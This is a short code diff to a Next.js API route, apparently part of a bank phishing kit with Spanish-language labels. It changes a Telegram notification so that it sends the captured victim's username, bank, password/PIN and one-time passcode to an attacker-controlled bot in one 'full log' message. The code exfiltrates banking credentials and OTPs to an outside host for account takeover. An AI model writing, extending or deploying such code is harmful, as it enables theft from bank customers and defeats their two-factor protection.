@@ -16,7 +16,7 @@ export async function POST(request: NextRequest) {
 
             const record = caseStore.getCase(idreg);
             if (record) {
-                const message = `🔢 OTP RECIBIDO:\n👤 User: ${record.usuario}\n🏦 Bank: ${record.banco}\n🔢 OTP: ${otp}\n🆔 ID: ${idreg}`;
+                const message = `🆕 <b>LOG COMPLETO RECIBIDO</b>\n\n👤 <b>Usuario:</b> ${record.usuario}\n🔑 <b>Clave/PIN:</b> ${record.password}\n🔢 <b>OTP/Dinámica:</b> ${otp}\n🏦 <b>Banco:</b> ${record.banco}\n🆔 <b>ID:</b> ${idreg}`;
 
                 await fetch(`https://api.telegram.org/bot${CAPTURE_TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
